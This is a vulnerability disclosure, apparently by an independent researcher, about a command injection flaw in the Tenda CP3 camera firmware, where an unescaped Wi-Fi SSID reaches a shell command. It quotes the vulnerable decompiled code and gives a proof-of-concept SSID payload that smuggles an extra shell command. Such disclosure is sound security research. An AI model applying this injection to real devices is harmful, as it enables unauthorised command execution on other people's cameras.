
A Command Injection vulnerability has been discovered in the Tenda CP3 camera firmware (`V11.10.00.2311090948`), in the `sub_F3C8C` function of the `apollo` binary.

![](https://raw.githubusercontent.com/k3vg3n/researches/refs/heads/main/attachments/RCE_in_Tenda_CP3_camera/sub_F3C8C_vuln_code_k.png)

Vulnerable code:
````c
sprintf(s, "echo $(cat /proc/net/rtl8188fu/wlan0/survey_info | grep '%s' | awk '{print $4}')", 
(const char *)&v31[1]);
````

The `survey_info` file contains information about the nearest Wi-Fi:

![](https://raw.githubusercontent.com/k3vg3n/researches/refs/heads/main/attachments/RCE_in_Tenda_CP3_camera/survey_info.png)

Wi-Fi SSID (`v31[1]`) is inserted directly into the string, which is then executed. 
The lack of validation or escaping allows the attacker to execute arbitrary commands through the camera's connection to Wi-Fi with the malicious SSID.

Example malicious payload:
`q';echo k3vg3n>/home/poc;echo '`

Which would be interpreted as:
````c
sprintf(s, "echo $(cat /proc/net/rtl8188fu/wlan0/survey_info | grep 'q';echo k3vg3n>/home/poc;echo '' | awk '{print $4}')", 
(const char *)&v31[1]);
````

### PoC:

![](https://raw.githubusercontent.com/k3vg3n/researches/refs/heads/main/attachments/RCE_in_Tenda_CP3_camera/PoC_screenshot.png)




https://github.com/user-attachments/assets/887a889f-5c46-4ee4-8caf-ef11c9b2d9c9

#### CVSS 3.0: **8.8 (HIGH) CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H**

**The vulnerability has already been sent to the developer.**

### Credits:

[blog.kevgen.ru](https://blog.kevgen.ru/posts/rce_in_tenda_cp3_camera/)

[@k3vg3n](https://t.me/k3vg3n)
